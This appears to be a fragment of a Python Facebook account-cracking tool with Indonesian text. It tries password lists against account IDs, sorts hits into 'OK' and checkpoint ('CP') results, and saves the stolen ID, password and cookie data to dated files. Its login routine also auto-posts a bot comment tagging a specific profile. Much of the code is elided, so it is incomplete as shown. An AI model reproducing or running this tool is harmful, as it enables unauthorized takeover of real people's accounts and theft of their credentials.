...
FOYSAL_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
FOYSAL_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
...
def login():
	...
	try:
		...
		tem      = ('\nAnjir keren Bang😼 @[100000424571603:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100000424571603/posts/826244541950192/?app=fbl')
...
def cek_akun():
	...
	xxx = input(' FOYSALpan akun tidak kenon ke file apa : \n nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
...
def manual():
	...
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {FOYSAL_ok}\n akun cp di : {FOYSAL_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+FOYSAL_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n├── Email  : {kk}{idf}{P}          \n│   └──  Sandi  : {kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}\n')
							os.popen
							open('CP/'+FOYSAL_cp,'a').write(idf+'|'+pw+'\n')
							break
				...
				if data in resok:pass
					...
					resok.append(data)
					ok+=1
					open('OK/'+FOYSAL_ok,'a').write(data+'\n')
					if "coki" in akunok:
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		else:open('CP/'+FOYSAL_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+FOYSAL_cp,'a').write(idf+'|'+pw+'\n')
	try:
